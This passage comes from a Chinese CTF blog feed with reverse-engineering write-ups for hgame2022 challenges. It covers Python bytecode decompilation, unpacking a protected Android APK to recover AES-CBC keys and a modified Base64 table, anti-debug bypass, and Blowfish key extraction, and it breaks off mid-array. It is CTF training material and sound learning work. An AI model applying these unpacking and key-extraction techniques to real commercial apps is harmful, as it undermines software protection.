class="language-none">flag='XXXXXXXX'</code></pre><p>第二段</p><pre class="language-python" data-language="python"><code class="language-python">4 LOAD_CONST               2 (0) const变量，一般用于传给函数的参数             6 BUILD_LIST               1  创建列表             8 LOAD_CONST               3 (18)   const变量  num=[0]*18            10 BINARY_MULTIPLY                12 STORE_FAST               1 (num) 保存值到局部变量中</code></pre><p>BINARY_MULTIPLY 是二元运算，即将栈顶的前两个元素取出进行计算，结果压回栈中 </p><p>BUILD_LIST 创建列表</p><pre class="language-none"><code class="language-none">num=[0]*18</code></pre><p>第三段</p><pre class="language-python" data-language="python"><code class="language-python">14 LOAD_CONST               2 (0)             16 STORE_FAST               2 (k)</code></pre><pre class="language-python" data-language="python"><code class="language-python">k=0</code></pre><p>第四段</p><pre class="language-python" data-language="python"><code class="language-python">18 LOAD_GLOBAL              0 (range) 加载全局变量             20 LOAD_GLOBAL              1 (len)              22 LOAD_FAST                0 (flag)              24 CALL_FUNCTION            1调用一个函数，在此之前要先赋值 len(flag)             26 CALL_FUNCTION            1  range(len(flag))             28 GET_ITER取迭代器        &gt;&gt;   30 FOR_ITER               112 (to 144)  一直到144都是for循环             32 STORE_FAST               3 (i) </code></pre><p> LOAD_GLOBAL 用来加载全局变量，包括指定函数名，类名，模块名等全局符号。当和函数搭配时，要注意有CALL_FUNCTION</p><p>LOAD_FAST一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。这里调用完len之后，要使用其传值，这里传入flag</p><p>前半段意思是</p><pre class="language-python" data-language="python"><code class="language-python">range(len(flag))</code></pre><p>GET_ITER创建迭代器，一般是for循环</p><p>FOR_ITER(to 144)表示迭代器一直到144</p><p>STORE_FAST 创建局部变量，这里作为for循环的索引</p><pre class="language-python" data-language="python"><code class="language-python">for i in range(len(flag)):</code></pre><p>第五段</p><pre class="language-python" data-language="python"><code class="language-python">7          34 LOAD_GLOBAL              2 (ord)             36 LOAD_FAST                0 (flag)            38 LOAD_FAST                3 (i)            40 BINARY_SUBSCR索引运算            42 CALL_FUNCTION            1ord(flag[i])            44 LOAD_FAST                3 (i)            46 BINARY_ADD+i            48 LOAD_FAST                2 (k)            50 LOAD_CONST               4 (3)            52 BINARY_MODULO//取模运算 k%3            54 LOAD_CONST               5 (1)             56 BINARY_ADD(k%3)+1            58 BINARY_XOR(ord(flag[i])+i)^(k%3+1)            60 LOAD_FAST                1 (num)            62 LOAD_FAST                3 (i)            64 STORE_SUBSCR num[i]</code></pre><p>BINARY_SUBSCR下标 访问操作</p><p>BINARY_ADD也是二元运算，相加</p><p>BINARY_MODULO，二元运算取模</p><p>BINARY_XOR二元运算异或</p><p>STORE_SUBSCR下标访问操作</p><pre class="language-python" data-language="python"><code class="language-python">num[i]= (ord(flag[i]) + i) ^ (k % 3 + 1)</code></pre><p>第六段</p><pre class="language-python" data-language="python"><code class="language-python">8          66 LOAD_GLOBAL              2 (ord)             68 LOAD_FAST                0 (flag)             70 LOAD_GLOBAL              1 (len)             72 LOAD_FAST                0 (flag)             74 CALL_FUNCTION            1len(flag)             76 LOAD_FAST                3 (i)len(flag)-i             78 BINARY_SUBTRACT             80 LOAD_CONST               5 (1)             82 BINARY_SUBTRACT减法len(flag)-i-1             84 BINARY_SUBSCR索引运算flag[len(flag)-i-1]             86 CALL_FUNCTION            1ord(flag[len(flag)-i-1])             88 LOAD_GLOBAL              1 (len)             90 LOAD_FAST                0 (flag)             92 CALL_FUNCTION            1len(flag)             94 BINARY_ADDord(flag[len(flag)-i-1])+len(flag)-i-1             96 LOAD_FAST                3 (i)             98 BINARY_SUBTRACT            100 LOAD_CONST               5 (1)            102 BINARY_SUBTRACT            104 LOAD_FAST                2 (k)            106 LOAD_CONST               4 (3)            108 BINARY_MODULOk%3            110 LOAD_CONST               5 (1)            112 BINARY_ADDk%3+1            114 BINARY_XORord(flag[len(flag)-i-1])+(len(flag)-i-1)^(k%3+1)            116 LOAD_FAST                1 (num)            118 LOAD_GLOBAL              1 (len)            120 LOAD_FAST                0 (flag)len(flag)            122 CALL_FUNCTION            1            124 LOAD_FAST                3 (i)            126 BINARY_SUBTRACTlen(flag)-i            128 LOAD_CONST               5 (1)            130 BINARY_SUBTRACTlen(flag)-i-1            132 STORE_SUBSCRnum[len(flag)-i-1]=ord(flag[len(flag)-i-1])+(len(flag)-i-1)^(k%3+1)</code></pre><p>BINARY_SUBTRACT二元运算减法</p><pre class="language-python" data-language="python"><code class="language-python">num[len(flag)-i-1]=ord(flag[len(flag)-i-1])+(len(flag)-i-1)^(k%3+1)</code></pre><p>第七段</p><pre class="language-python" data-language="python"><code class="language-python">9         134 LOAD_FAST                2 (k)            136 LOAD_CONST               5 (1)            138 INPLACE_ADDk++            140 STORE_FAST               2 (k)            142 JUMP_ABSOLUTE           30//循环结束</code></pre><p>JUMP_ABSOLUTE绝对跳转，结束循环</p><p>INPLACE_ADD  计算结果可以被操作数引用的到，每一个 二元运算，都对应一个inplace 运算 </p><pre class="language-python" data-language="python"><code class="language-python">k+=1</code></pre><p>第八段</p><pre class="language-python" data-language="python"><code class="language-python">10     &gt;&gt;  144 LOAD_GLOBAL              3 (print)            146 LOAD_FAST                1 (num)            148 CALL_FUNCTION            1 print(num)            150 POP_TOP            152 LOAD_CONST               0 (None)            154 RETURN_VALUE</code></pre><pre class="language-none"><code class="language-none">print(num)</code></pre><h1 id="Easy-Re"><a href="#Easy-Re" class="headerlink" title="Easy_Re"></a>Easy_Re</h1><p>python3.9，无法uncompyle6，使用pycdc翻译成字节码</p><pre class="language-python" data-language="python"><code class="language-python">main.pyc (Python 3.9)[Code]    File Name: main.py    Object Name: &lt;module&gt;    Arg Count: 0    Pos Only Arg Count: 0    KW Only Arg Count: 0    Locals: 0    Stack Size: 4    Flags: 0x00000040 (CO_NOFREE)    [Names]        'base64'        'encode'        'enCodeAgain'        'correct'        'flag'        'print'        'input'    [Var Names]    [Free Vars]    [Cell Vars]    [Constants]        0        None        [Code]            File Name: main.py            Object Name: encode            Arg Count: 1            Pos Only Arg Count: 0            KW Only Arg Count: 0            Locals: 4            Stack Size: 5            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)            [Names]                'chr'                'base64'                'b64encode'                'encode'            [Var Names]                'message'                's'                'i'                'x'            [Free Vars]            [Cell Vars]            [Constants]                None                ''                32                16                'utf-8' [Disassembly]                0       LOAD_CONST              1: ''                2       STORE_FAST              1: s       s=''                4       LOAD_FAST               0: message                6       GET_ITER                                8       FOR_ITER                32 (to 42) for i in message:                10      STORE_FAST              2: i                   12      LOAD_FAST               2: i                  14      LOAD_CONST              2: 32                16      BINARY_XOR               i^32                18      STORE_FAST              3: xx=i^32                20      LOAD_FAST               3: x                22      LOAD_CONST              3: 16                24      BINARY_ADD              x+16                26      STORE_FAST              3: xx=x+16                28      LOAD_FAST               1: s                30      LOAD_GLOBAL             0: chr                32      LOAD_FAST               3: x                    34      CALL_FUNCTION           1  chr(x)                36      INPLACE_ADD             s+chr(x)                38      STORE_FAST              1: ss=s+chr(x)                40      JUMP_ABSOLUTE           8    循环结束                42      LOAD_GLOBAL             1: base64                44      LOAD_METHOD             2: b64encodebase64.b64                46      LOAD_FAST               1: s                48      LOAD_METHOD             3: encode   LOAD_METHOD是加载类，CALL调用                50      LOAD_CONST              4: 'utf-8'                 52      CALL_METHOD             1                  54      CALL_METHOD             1 base64.b64(s.encode('utf-8'))                56      RETURN_VALUE            return  base64.b64(s.encode('utf-8'))        'encode'        [Code]            File Name: main.py            Object Name: enCodeAgain            Arg Count: 2            Pos Only Arg Count: 0            KW Only Arg Count: 0            Locals: 5            Stack Size: 5            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)            [Names]                'str'                'range'                'len'            [Var Names]                'string'                'space'                's'                'i'                'j'            [Free Vars]            [Cell Vars]            [Constants]                None                ''                'utf-8'                0            [Disassembly]                0       LOAD_CONST              1: ''                  2       STORE_FAST              2: ss=''                4       LOAD_GLOBAL             0: str                6       LOAD_FAST               0: string                8       LOAD_CONST              2: 'utf-8'                 10      CALL_FUNCTION           2//参数个数 str(string,'utf-8')                12      STORE_FAST              0: string string=str(string,'utf-8')                14      LOAD_GLOBAL             1: range                 16      LOAD_CONST              3: 0                18      LOAD_FAST               1: space                20      CALL_FUNCTION           2 range(0,space)                22      GET_ITER                //创建迭代器                24      FOR_ITER                50 (to 76)                 26      STORE_FAST              3: ifor i range(0,space):                28      LOAD_GLOBAL             1: range                 30      LOAD_FAST               3: i                32      LOAD_GLOBAL             2: len                34      LOAD_FAST               0: string                36      CALL_FUNCTION           1len(string)                38      LOAD_FAST               1: space                40      CALL_FUNCTION           3                 42      GET_ITER                                44      FOR_ITER                28 (to 74)                46      STORE_FAST              4: j  for j in range(i,len(string),space)                48      LOAD_FAST               4: j                 50      LOAD_GLOBAL             2: len                52      LOAD_FAST               0: string                54      CALL_FUNCTION           1  len(string)                56      COMPARE_OP              0 (&lt;)if(j&lt;len(string))                58      POP_JUMP_IF_FALSE       44跳转                60      LOAD_FAST               2: s                62      LOAD_FAST               0: string                64      LOAD_FAST               4: j                66      BINARY_SUBSCR           string[j]                68      INPLACE_ADD                             70      STORE_FAST              2: s      s+=string[j]                72      JUMP_ABSOLUTE           44第二个循环                74      JUMP_ABSOLUTE           24第一个循环                76      LOAD_FAST               2: s                78      RETURN_VALUE             return s        'enCodeAgain'        'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='        ''        'Input flag:'        'utf-8'        2        'correct'        'wrong'    [Disassembly]        0       LOAD_CONST              0: 0        2       LOAD_CONST              1: None        4       IMPORT_NAME             0: base64        6       STORE_NAME              0: base64import base64        8       LOAD_CONST              2: &lt;CODE&gt; encode        10      LOAD_CONST              3: 'encode' //函数        12      MAKE_FUNCTION           0        14      STORE_NAME              1: encode        16      LOAD_CONST              4: &lt;CODE&gt; enCodeAgain        18      LOAD_CONST              5: 'enCodeAgain'        20      MAKE_FUNCTION           0//第二个函数        22      STORE_NAME              2: enCodeAgain        24      LOAD_CONST              6: 'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='        26      STORE_NAME              3: correctcorrect=VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ=        28      LOAD_CONST              7: ''        30      STORE_NAME              4: flagflag=''        32      LOAD_NAME               5: print        34      LOAD_CONST              8: 'Input flag:'        36      CALL_FUNCTION           1print('Int flag:')        38      POP_TOP                         40      LOAD_NAME               6: input        42      CALL_FUNCTION           0input()        44      STORE_NAME              4: flagflag=input()        46      LOAD_NAME               4: flag        48      LOAD_METHOD             1: encode        50      LOAD_CONST              9: 'utf-8'        52      CALL_METHOD             1        54      STORE_NAME              4: flagflag=flag.encode('utf-8')        56      LOAD_NAME               5: print        58      LOAD_NAME               2: enCodeAgain        60      LOAD_NAME               1: encode        62      LOAD_NAME               4: flag        64      CALL_FUNCTION           1        66      LOAD_CONST              10: 2 其中一个参数        68      CALL_FUNCTION           2//两个参数        70      CALL_FUNCTION           1print(enCodeAgain(encodee(flag),2))        72      POP_TOP                 函数栈顶元素出栈        74      LOAD_NAME               2: enCodeAgain        76      LOAD_NAME               1: encode        78      LOAD_NAME               4: flag        80      CALL_FUNCTION           1        82      LOAD_CONST              10: 2        84      CALL_FUNCTION           2(enCodeAgain(encodee(flag),2))        86      LOAD_NAME               3: correct        88      COMPARE_OP              2 (==)//比较        90      POP_JUMP_IF_FALSE       102跳转        92      LOAD_NAME               5: print        94      LOAD_CONST              11: 'correct'        96      CALL_FUNCTION           1print('correct')        98      POP_TOP                         100     JUMP_FORWARD            8 (to 110)结束        102     LOAD_NAME               5: print        104     LOAD_CONST              12: 'wrong'        106     CALL_FUNCTION           1print('wrong)        108     POP_TOP                         110     LOAD_CONST              1: None        112     RETURN_VALUE            </code></pre><pre class="language-python" data-language="python"><code class="language-python">import base64def encode(message):    s = ''    for i in message:        x = i ^ 32        x += 16        s += chr(x)        return (base64.b64encode(s.encode('utf-8')))def enCodeAgain(string, space):    s = ''    string = str(string, 'utf-8')    for i in range(0, space):        for j in range(i, len(string), space):            if j &lt; len(string):                s += string[j]    return scorrect = 'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='flag = ''print('Input flag:')flag = input()flag = flag.encode('utf-8')print(enCodeAgain(encode(flag), 2))if enCodeAgain(encode(flag), 2) == correct:    print(correct)else:    print('wrong')</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2022-week3-re</title>
      <link href="/2022/02/13/hgame2022-week3-re/"/>
      <url>/2022/02/13/hgame2022-week3-re/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是总结和反思吧</p><h1 id="hardened"><a href="#hardened" class="headerlink" title="hardened"></a>hardened</h1><h2 id="考点：加壳、AES-CBC、Base64魔改"><a href="#考点：加壳、AES-CBC、Base64魔改" class="headerlink" title="考点：加壳、AES-CBC、Base64魔改"></a>考点：加壳、AES-CBC、Base64魔改</h2><h2 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h2><p>首先可以先试试用jeb打开</p><p><img src="/2022/02/13/hgame2022-week3-re/1644828115040.png"></p><p><img src="/2022/02/13/hgame2022-week3-re/1644828621422.png"></p><p>没有找到mainactivitity，且有application，应该是加了壳，去lib找一下so文件，进行识别</p><pre class="language-none"><code class="language-none">markNameMap.put("libchaosvmp.so", "娜迦");markNameMap.put("libddog.so", "娜迦");markNameMap.put("libfdog.so", "娜迦");markNameMap.put("libedog.so", "娜迦企业版");markNameMap.put("libexec.so", "爱加密");markNameMap.put("libexecmain.so", "爱加密");markNameMap.put("ijiami.dat", "爱加密");markNameMap.put("ijiami.ajm", "爱加密企业版");markNameMap.put("libsecexe.so", "梆梆免费版");markNameMap.put("libsecmain.so", "梆梆免费版");markNameMap.put("libSecShell.so", "梆梆免费版");markNameMap.put("libDexHelper.so", "梆梆企业版");markNameMap.put("libDexHelper-x86.so", "梆梆企业版");markNameMap.put("libprotectClass.so", "360");markNameMap.put("libjiagu.so", "360");markNameMap.put("libjiagu_art.so", "360");markNameMap.put("libjiagu_x86.so", "360");markNameMap.put("libegis.so", "通付盾");markNameMap.put("libNSaferOnly.so", "通付盾");markNameMap.put("libnqshield.so", "网秦");markNameMap.put("libbaiduprotect.so", "百度");markNameMap.put("aliprotect.dat", "阿里聚安全");markNameMap.put("libsgmain.so", "阿里聚安全");markNameMap.put("libsgsecuritybody.so", "阿里聚安全");markNameMap.put("libmobisec.so", "阿里聚安全");markNameMap.put("libtup.so", "腾讯");markNameMap.put("libexec.so", "腾讯");markNameMap.put("libshell.so", "腾讯");markNameMap.put("mix.dex", "腾讯");markNameMap.put("lib/armeabi/mix.dex", "腾讯");markNameMap.put("lib/armeabi/mixz.dex", "腾讯");markNameMap.put("libtosprotection.armeabi.so", "腾讯御安全");markNameMap.put("libtosprotection.armeabi-v7a.so", "腾讯御安全");markNameMap.put("libtosprotection.x86.so", "腾讯御安全");markNameMap.put("libnesec.so", "网易易盾");markNameMap.put("libAPKProtect.so", "APKProtect");markNameMap.put("libkwscmm.so", "几维安全");markNameMap.put("libkwscr.so", "几维安全");markNameMap.put("libkwslinker.so", "几维安全");markNameMap.put("libx3g.so", "顶像科技");markNameMap.put("libapssec.so", "盛大");markNameMap.put("librsprotect.so", "瑞星");</code></pre><p>这个程序是被梆梆加固加固过的</p><p>使用工具脱壳-</p><p><img src="/2022/02/13/hgame2022-week3-re/1644829142036.png"></p><p>安装到手机或者模拟器上面</p><p><img src="/2022/02/13/hgame2022-week3-re/1644829295135.png"></p><p>找到目录再移动到共享文件夹就可以了</p><p><img src="/2022/02/13/hgame2022-week3-re/1644829809855.png"></p><p>选中后打开共享文件夹，打开安卓文件夹</p><p><img src="/2022/02/13/hgame2022-week3-re/1644829839920.png"></p><p><img src="/2022/02/13/hgame2022-week3-re/1644829849310.png"></p><p>移动到此</p><p><img src="/2022/02/13/hgame2022-week3-re/1644829879528.png"></p><p>再打开电脑文件夹就可以找到了</p><p><img src="/2022/02/13/hgame2022-week3-re/1644829901534.png"></p><p>把dex依次拖入jeb，发现540702有关键信息</p><p><img src="/2022/02/13/hgame2022-week3-re/1644830177982.png"></p><p>第二段是关键比较</p><p>查看前一个方框中引用的类</p><p><img src="/2022/02/13/hgame2022-week3-re/1644830302545.png"></p><p>是用来调用so的，改为zip文件把enc.so文件拖进ida进行分析</p><p><img src="/2022/02/13/hgame2022-week3-re/1644830479144.png"></p><p>找到关键的函数，可以看出是aes-cbc模式，查看AES函数调用的关键参数</p><p><img src="/2022/02/13/hgame2022-week3-re/1644830690500.png"></p><p>找到key和iv，对一些关键数据查看交叉引用</p><p>发现其他加密函数</p><p><img src="/2022/02/13/hgame2022-week3-re/1644830877369.png"></p><p><img src="/2022/02/13/hgame2022-week3-re/1644830924673.png"></p><p>base64，再看看有没有魔改，对表查看交叉引用</p><p><img src="/2022/02/13/hgame2022-week3-re/1644830970190.png"></p><p>发现对key和iv，以及base64表都进行了异或操作，写脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){char key[32] = {0x7A, 0x65, 0x63, 0x64, 0x6F, 0x71, 0x6F, 0x7E, 0x7F, 0x62, 0x7D, 0x71, 0x7C, 0x6F, 0x7B, 0x75,0x69, 0x6F, 0x76, 0x7F, 0x62, 0x6F, 0x69, 0x7F, 0x65, 0x6F, 0x64, 0x7F, 0x6F, 0x74, 0x75, 0x73};char iv[16] = {0x06, 0x10, 0x0A, 0x20, 0x19, 0x16, 0x11, 0x1B,0x20, 0x12, 0x1A, 0x5E, 0x5E, 0x5E, 0x5E, 0x5E};char base64_table[63] = {0x79, 0x78, 0x7B, 0x7A, 0x7D, 0x7C, 0x7F, 0x7E, 0x71, 0x70, 0x08, 0x0B, 0x0A, 0x0D, 0x0C, 0x0F,0x0E, 0x01, 0x00, 0x03, 0x02, 0x05, 0x04, 0x07, 0x06, 0x19, 0x18, 0x1B, 0x1A, 0x1D, 0x1C, 0x1F,0x1E, 0x11, 0x10, 0x13, 0x28, 0x2B, 0x2A, 0x2D, 0x2C, 0x2F, 0x2E, 0x21, 0x20, 0x23, 0x22, 0x25,0x24, 0x27, 0x26, 0x39, 0x38, 0x3B, 0x3A, 0x3D, 0x3C, 0x3F, 0x3E, 0x31, 0x30, 0x33, 0x62};for (int i = 0; i &lt; 32; ++i){key[i] ^= 0x30;printf("%c", key[i]);}printf("\n");for (int i = 0; i &lt; 16; ++i){iv[i] ^= 0x7f;printf("%c", iv[i]);}printf("\n");for (int i = 0; i &lt; 63; ++i){base64_table[i] ^= 0x49;printf("%c", base64_table[i]);}return 0;}</code></pre><p><img src="/2022/02/13/hgame2022-week3-re/1644831095464.png"></p><p>找在线网站解密-<a href="https://www.iculture.cc/demo/cyberchef/">https://www.iculture.cc/demo/cyberchef/</a></p><p><img src="/2022/02/13/hgame2022-week3-re/1644831134385.png"></p><h1 id="Answer’s-Windows"><a href="#Answer’s-Windows" class="headerlink" title="Answer’s Windows"></a>Answer’s Windows</h1><h2 id="考点：QT逆向、Base64魔改"><a href="#考点：QT逆向、Base64魔改" class="headerlink" title="考点：QT逆向、Base64魔改"></a>考点：QT逆向、Base64魔改</h2><h2 id="做题过程-1"><a href="#做题过程-1" class="headerlink" title="做题过程"></a>做题过程</h2><p><img src="/2022/02/13/hgame2022-week3-re/1644826230792.png"></p><p>根据字符串的搜索功能，快速定位到关键函数，可以看到进行了字符串比较，所以往上找到对字符串进行操作的函数</p><p><img src="/2022/02/13/hgame2022-week3-re/1644826372187.png"></p><p><img src="/2022/02/13/hgame2022-week3-re/1644826396198.png"></p><p>从这些关键特征可以猜测是base64，但是根据最后的字符串，可知道应该是对base64表进行了修改</p><p>查看交叉引用</p><p><img src="/2022/02/13/hgame2022-week3-re/1644826515161.png"></p><p><img src="/2022/02/13/hgame2022-week3-re/1644826528911.png"></p><p>这时候可以绕过反调试进行动调，得到base64表</p><p><img src="/2022/02/13/hgame2022-week3-re/1644827711098.png"></p><p>然后写脚本即可</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include &lt;string.h&gt;char base64_table[] = {  0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,  0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34,  0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E,  0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,  0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,  0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C,  0x5D, 0x5E, 0x5F, 0x60, 0x61};void base64_encode(char raw[], char encode[]){int code_len = strlen(raw);int final_len = 0;if (code_len % 3){final_len = (code_len / 3 + 1) * 4;}elsefinal_len = (code_len / 3) * 4;int i = 0, i_ = 0;for (; i &lt; code_len; i += 3, i_ += 4){encode[i_] = base64_table[raw[i] &gt;&gt; 2];encode[i_ + 1] = base64_table[((raw[i] &amp; 0x03) &lt;&lt; 4) | ((raw[i + 1]) &gt;&gt; 4)];encode[i_ + 2] = base64_table[((raw[i + 1] &amp; 0x0f) &lt;&lt; 2) | ((raw[i + 2] ) &gt;&gt; 6)];encode[i_ + 3] = base64_table[raw[i + 2] &amp; 0x3f];}if (code_len % 3 == 1){encode[i_ - 1] = '=';encode[i_ - 2] = '=';}else if (code_len % 3 == 2){encode[i_ - 1] = '=';}return;}int Findindex(char c){for (int i = 0; i &lt; strlen(base64_table); ++i){if (c == base64_table[i])return i;}}void base64_decode(char* encode, char* decode){int decode_len=0;int encode_len = strlen(encode);if (strstr(encode, "=="))decode_len = (encode_len / 4) * 3 - 2;else if (strstr(encode, "="))decode_len = (encode_len / 4) * 3 - 1;elsedecode_len = (encode_len / 4) * 3;int i = 0, i_ = 0;for (; i &lt; encode_len; i_ += 4, i += 3){decode[i] = (Findindex(encode[i_]) &lt;&lt; 2) | (Findindex(encode[i_ + 1]) &amp; 0x30) &gt;&gt; 4;decode[i + 1] = ((Findindex(encode[i_ + 1]) &amp; 0xf) &lt;&lt; 4) | ((Findindex(encode[i_ + 2]) &amp; 0x3c) &gt;&gt; 2);decode[i + 2] = ((Findindex(encode[i_ + 2]) &amp; 0x3) &lt;&lt; 6) | ((Findindex(encode[i_ + 3])));}decode[decode_len] = 0;return;}int main(){char raw[] = ";'&gt;B&lt;76\\=82@-8.@=T\"@-7ZU:8*F=X2J&lt;G&gt;@=W^@-8.@9D2T:49U@1aa";char encode[100] = { 0 };char decode[100] = { 0 };/*base64_encode(raw, encode);printf("%s", encode);*/base64_decode(raw, decode);printf("%s", decode);}</code></pre><h1 id="creakme3"><a href="#creakme3" class="headerlink" title="creakme3"></a>creakme3</h1><h2 id="考点：猴子排序"><a href="#考点：猴子排序" class="headerlink" title="考点：猴子排序"></a>考点：猴子排序</h2><h2 id="做题过程-2"><a href="#做题过程-2" class="headerlink" title="做题过程"></a>做题过程</h2><p>开始用7.0无法反编译，使用7.5就行</p><p><img src="/2022/02/13/hgame2022-week3-re/1644827237787.png"></p><p>因为要满足for的第二个条件，所以就是进行排序，rand这一步是为了限制数组内的值小于88，而第二个条件是以偶数下标作为索引，前一个要大于后一个，所以使用结构体数组</p><p>脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;struct data{int asc;int num;};struct data a[89]={{48,20093},{48,26557},{48,31304},{48,33442},{48,37694},{49,39960},{50,23295},{50,27863},{50,42698},{50,48505},{50,52925},{51,12874},{51,12946},{51,14597},{51,17041},{51,23262},{51,28319},{51,42282},{51,48693},{51,52067},{53,32571},{56,14612},{56,45741},{57,14554},{57,20048},{57,27138},{57,45327},{66,30949},{95,32502},{95,35235},{95,36541},{95,38371},{97,29658},{100,21388},{100,25403},{100,40604},{100,46987},{100,51302},{101,12974},{101,30329},{102,10983},{102,19818},{102,22280},{102,26128},{102,41560},{102,47116},{102,51333},{103,28938},{103,31988},{104,16246},{104,28715},{104,41966},{104,44368},{104,47815},{105,16420},{105,35362},{105,49237},{106,11090},{106,50823},{107,24320},{107,50199},{108,24962},{109,30171},{110,15457},{110,18838},{110,24001},{111,11638},{111,32023},{111,43291},{112,39661},{114,17872},{114,33895},{114,43869},{115,20611},{115,25122},{115,36243},{115,37434},{115,38686},{115,46266},{115,51077},{116,13656},{116,34493},{116,38712},{117,14096},{117,38777},{119,12095},{119,17629},{123,30945},{125,40770}};int main(){for (int i = 0; i &lt; 89; ++i){for (int j = i + 1; j &lt; 89; ++j){if (a[i].num &gt;= a[j].num){struct data tmp = a[i];a[i] = a[j];a[j] = tmp;}}}for (int i = 0; i &lt; 89; ++i){printf("%c", a[i].asc);}return 0;}</code></pre><h1 id="fishman"><a href="#fishman" class="headerlink" title="fishman"></a>fishman</h1><h2 id="考点：pyd逆向、Blowfish分组加密算法"><a href="#考点：pyd逆向、Blowfish分组加密算法" class="headerlink" title="考点：pyd逆向、Blowfish分组加密算法"></a>考点：pyd逆向、Blowfish分组加密算法</h2><h2 id="做题过程-3"><a href="#做题过程-3" class="headerlink" title="做题过程"></a>做题过程</h2><p>附件给了一个pyd文件，pyd文件是python的动态库，拖进ida分析</p><p><img src="/2022/02/13/hgame2022-week3-re/1644835618562.png"></p><p>使用Findcrypt插件查看发现是Blowfish加密算法</p><p>Blowfish-<a href="https://www.cnblogs.com/iBinary/p/14883752.html">https://www.cnblogs.com/iBinary/p/14883752.html</a></p><p><img src="/2022/02/13/hgame2022-week3-re/1644835958154.png"></p><p>加密后的数据</p><p>可以动调得到S盒和P盒的数据再写脚本，也可以不用，在string发现一个类似key的字符串</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836282247.png"></p><h3 id="pyd动调"><a href="#pyd动调" class="headerlink" title="pyd动调"></a>pyd动调</h3><p><img src="/2022/02/13/hgame2022-week3-re/1644836332456.png"></p><p>这是里面的一些函数，init初始化，check检查字符串</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836466799.png"></p><p>cp后面是python的版本，这里是3.9，把pyd文件修改名称为fishman.pyd，放入D:\python3.9\Lib\site-packages\</p><p>脚本</p><pre class="language-python" data-language="python"><code class="language-python">import fishmanimport osprint(os.getpid())flag=input("input your flag here:")fishman.init()print(fishman.check(flag))</code></pre><p><img src="/2022/02/13/hgame2022-week3-re/1644836396140.png"></p><p>下好断点开启调试</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836650927.png"></p><p>这是线程，去ida，attach to process</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836705113.png"></p><p>注意要先在ida下好断点</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836779973.png"></p><p>停在了dll文件，要F9继续运行</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836830306.png"></p><p>这里处于Running状态，回去python程序，F8单步步过</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836868323.png"></p><p>回到ida分析</p><p><img src="/2022/02/13/hgame2022-week3-re/1644836914886.png"></p><p>停在了这里，这时候已经完成对S盒和P盒的初始化，找到后提取出来即可</p><p>贴一下大佬的脚本</p><p>blowfish.cpp</p><pre class="language-c" data-language="c"><code class="language-c">#include"blowfish_head.h"#include&lt;stdio.h&gt;//变换后的P盒unsigned long pbx[18] ={0x6af74079, 0xc87db4da, 0x064b77a4, 0x33a56687, 0x73924432, 0x3a78e859, 0xa0f9451e, 0x6e99ea5f, 0xcb62f79c,0xec009d50, 0x46b85709, 0x3b2bfdf6, 0xd0a0f937, 0x67c4c3e1, 0x80d02257, 0x4162d4de, 0x814dce61, 0x227bde9b};//变换后的S盒unsigned long sbx[4][256] ={{ 0x857e5597, 0x326dad20, 0x2d507f8e, 0x2b80ba2c, 0xd711e661, 0x4b7e9667, 0x7a4b2509, 0x5117c0a3, 0x537791d2,0xbda0ec99, 0x9f5d600, 0x97d7453e, 0x6c3dede1, 0xefbec2ec, 0x31f20650, 0x86ea7ee1, 0x4a380c4e, 0x688500c0,0xc939e94b, 0xee64fe1f, 0xdae4a7bd, 0xafdfe274, 0xef95a497, 0xca5e8fc8, 0xa16220a, 0x9c85d82f, 0x3f411e1f,0x199cd133, 0x52ecbaa8, 0x68886557, 0xf8d4ca71, 0x729c0def, 0x5d6d4eb4, 0x550b9697, 0x77a9b569, 0xae8aacd5,0xa48c80d0, 0xb171f834, 0xd6828c5f, 0xf5219b37, 0x260e8a36, 0x9a8fbeba, 0xdf6ca01, 0x5f5ee56f, 0xc2e21a2f,0x87d75493, 0x87ef74ef, 0xfe01a2da, 0x8326e260, 0x7b3f0f, 0xc21ab19, 0x589f28be, 0x9ff0636, 0x2ac6affc, 0xb8e547d,0x91fa13e2, 0xde9a211f, 0x70b95314, 0x5879cad1, 0x8d38aa78, 0xffae559e, 0x132d25af, 0x4244c5f1, 0x7831cb8d,0x5625d8a2, 0xa99878b6, 0x44dfa664, 0x5b4e43c7, 0xfde79c18, 0xa8f89efb, 0x96a65669, 0xfa7ec977, 0x6438138b,0x63098e28, 0x7048ba4b, 0xc6f0e94, 0xabc7ae87, 0xdce4560, 0x2ee85291, 0xa7e24dd8, 0xdf0b5970, 0x3d8fcbe5,0x55b43ae4, 0x9eceee50, 0x6542e890, 0x4f70b16b, 0x778b58dc, 0xf3f830e4, 0x1b9d5867, 0x7076b41c, 0x6b8386de,0x8b148ce, 0x31c2fb7d, 0x42fe87c5, 0x108eb334, 